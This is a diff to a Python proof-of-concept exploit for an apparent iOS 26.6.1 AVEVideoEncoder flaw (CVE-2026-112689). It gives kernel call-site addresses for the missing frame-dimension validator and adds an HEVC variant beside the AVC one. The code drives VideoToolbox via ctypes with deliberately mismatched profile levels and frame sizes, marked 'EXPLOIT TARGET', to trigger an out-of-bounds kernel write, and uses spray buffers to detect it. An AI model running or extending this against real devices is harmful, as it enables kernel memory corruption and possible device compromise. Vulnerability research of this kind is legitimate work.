@@ -3,13 +3,22 @@
 CVE-2026-112689 PoC — AVEVideoEncoder frame dimension validation bypass
 Target: iOS 26.6.1 (iPhone17,4, build 23G83)
 
-Bug: AVE_AVC_CheckInfo (0x851c454) validates iNumViews/iLayerNum but does NOT call
-     the frame dimension validator (0x852f9d4) for standard AVC sessions.
-     In 26.7.2 this call was added (sub_fffffff00853aa34).
+Bug: AVE_AVC_CheckInfo (0x851c454) and AVE_HEVC_CheckInfo do NOT call
+     the frame dimension validator sub_fffffff00853aa34 (added in 26.7.2).
+     Both AVC and HEVC paths are open on 26.6.1.
+
+Call sites added in 26.7.2 (all ABSENT in 26.6.1):
+  0xfffffff008524700 — AVE_AVC_CheckInfo (AVC codec, w1=#1)
+  0xfffffff008524df0 — AVE_HEVC_CheckInfo (HEVC codec)
+  0xfffffff0085278cc — HEVC variant (w1=#4, w2=#2)
 
 Attack: Set codec level = Baseline 1.0 (max 99 MBs = 176×144 capacity)
         with frame = 1920×1080 (8160 MBs actual).
         AVE2 allocates buffer sized for 99 MBs, write loop uses 8160 MBs → OOB.
+
+CVE-2026-112468/469/470 write loop fix: a type-system refactor — new bounded buffer
+types in 0x853xxxx enforce write_count ≤ allocated_count. These don't exist in 26.6.1.
+The write count at encode-time diverges from the allocation count → OOB write.
 
 Run via ResearchHost offload_python. Close PocketCode first (memory constraint).
 """
@@ -139,16 +148,16 @@ def vt_key(name):
                         .replace('kVTProfileLevel_', ''))
 
 kCMVideoCodecType_H264 = 0x61766331  # 'avc1'
+kCMVideoCodecType_HEVC = 0x68657663  # 'hevc'
 
 # Profile level strings (the actual CFString values)
 # kVTProfileLevel_H264_Baseline_1_0 = CFSTR("H264_Baseline_1_0")
-PROFILE_LEVELS = [
-    ("H264_Baseline_1_0",  "Baseline 1.0 — max  99 MBs (176×144)"),
-    ("H264_Baseline_3_0",  "Baseline 3.0 — max 1620 MBs (1280×720 ~ok)"),
-    ("H264_Main_3_1",      "Main 3.1     — max 3600 MBs"),
-    ("H264_High_4_0",      "High 4.0     — max 24576 MBs"),
-    ("H264_High_4_1",      "High 4.1     — max 24576 MBs"),
-    ("H264_High_Auto",     "High Auto    — level picked by encoder"),
+PROFILE_LEVELS_AVC = [
+    ("H264_Baseline_1_0",  "AVC Baseline 1.0 — max  99 MBs (176×144)"),
+    ("H264_Baseline_3_0",  "AVC Baseline 3.0 — max 1620 MBs (1280×720 ~ok)"),
+    ("H264_Main_3_1",      "AVC Main 3.1     — max 3600 MBs"),
+    ("H264_High_4_0",      "AVC High 4.0     — max 24576 MBs"),
+    ("H264_High_Auto",     "AVC High Auto    — level picked by encoder"),
 ]
 
 # ── Spray / victim buffers for OOB detection ─────────────────────────────────
@@ -299,28 +308,89 @@ def run_poc(width, height, profile_str, profile_desc, num_frames=3, check_victim
     return success_count > 0
 
 
+def run_poc_hevc(width, height, profile_str, profile_desc, num_frames=3):
+    """HEVC variant — uses kCMVideoCodecType_HEVC (0x68657663).
+    AVE_HEVC_CheckInfo on 26.6.1 also lacks the dimension validator call.
+    """
+    print(f"\n{'='*60}")
+    print(f"Testing HEVC: {profile_desc}")
+    print(f"Frame: {width}×{height}")
+
+    session = ctypes.c_void_p(0)
+    kr, pb = make_pixel_buffer(width, height)
+    if kr != 0 or not pb:
+        print(f"CVPixelBufferCreate FAILED: kr=0x{kr:x}")
+        return False
+
+    kr = VT.VTCompressionSessionCreate(
+        None, width, height, kCMVideoCodecType_HEVC,
+        None, None, None, None, None,
+        ctypes.byref(session)
+    )
+    print(f"VTCompressionSessionCreate HEVC: kr=0x{kr:x} session=0x{session.value or 0:x}")
+    if kr != 0 or not session.value:
+        print("  FAILED — HEVC session rejected")
+        CV.CVPixelBufferRelease(pb)
+        return False
+
+    # Set profile level for HEVC
+    profile_cfstr = cfstr(profile_str)
+    try:
+        key_sym = ctypes.c_void_p.in_dll(VT, 'kVTCompressionPropertyKey_ProfileLevel')
+        key_ptr = key_sym.value
+    except Exception:
+        key_ptr = cfstr('ProfileLevel')
+    kr_level = VT.VTSessionSetProperty(session.value, key_ptr, profile_cfstr)
+    print(f"SetProperty ProfileLevel={profile_str}: kr=0x{kr_level:x}")
+    CF.CFRelease(profile_cfstr)
+
+    flags_out = ctypes.c_uint32(0)
+    success_count = 0
+    for i in range(num_frames):
+        pts = make_cmtime(i * 1000, 30000)
+        dur = make_cmtime(1000, 30000)
+        kr_enc = VT.VTCompressionSessionEncodeFrame(
+            session.value, pb, pts, dur, None, None, ctypes.byref(flags_out)
+        )
+        print(f"  EncodeFrame[{i}]: kr=0x{kr_enc:x}")
+        if kr_enc != 0:
+            break
+        success_count += 1
+        time.sleep(0.1)
+
+    CF.CFRelease(session.value)
+    CV.CVPixelBufferRelease(pb)
+    return success_count > 0
+
+
 def main():
     print("CVE-2026-112689 PoC — AVEVideoEncoder dimension bypass")
     print("Target: iOS 26.6.1 (23G83) iPhone17,4")
+    print("Both AVC and HEVC paths are open (sub_fffffff00853aa34 not called in 26.6.1)")
     print()
 
-    # Stage 1: Probe which level/dimension combos succeed
-    # Start conservative, then escalate
-    test_cases = [
+    # AVC test cases: control first, then exploit target
+    avc_cases = [
         # (width, height, profile_str, description)
-        (1920, 1080, "H264_Baseline_3_0", "1080p + Baseline 3.0 (control — should work)"),
-        (1920, 1080, "H264_Baseline_1_0", "1080p + Baseline 1.0 (max 99 MBs — EXPLOIT TARGET)"),
-        (3840, 2160, "H264_Baseline_1_0", "4K + Baseline 1.0 (max 99 MBs — max OOB)"),
-        (1920, 1080, "H264_Main_3_0",     "1080p + Main 3.0"),
+        (1920, 1080, "H264_Baseline_3_0", "1080p + AVC Baseline 3.0 (control — should work)"),
+        (1920, 1080, "H264_Baseline_1_0", "1080p + AVC Baseline 1.0 (max 99 MBs — EXPLOIT TARGET)"),
+        (3840, 2160, "H264_Baseline_1_0", "4K   + AVC Baseline 1.0 (max 99 MBs — max OOB)"),
     ]
 
-    for width, height, profile, desc in test_cases:
+    for width, height, profile, desc in avc_cases:
         try:
             result = run_poc(width, height, profile, desc, num_frames=3, check_victims=True)
             print(f"→ Encode succeeded: {result}")
         except Exception as e:
             print(f"→ Exception: {e}")
         time.sleep(1)
+
+    # HEVC test: same bypass applies (AVE_HEVC_CheckInfo also lacks dimension validator)
+    try:
+        run_poc_hevc(1920, 1080, "HEVC_Main_AutoLevel",
+                     "1080p + HEVC Auto (HEVC bypass path)", num_frames=2)
+    except Exception as e:
+        print(f"→ HEVC Exception: {e}")
 
     print("\nDone.")
 
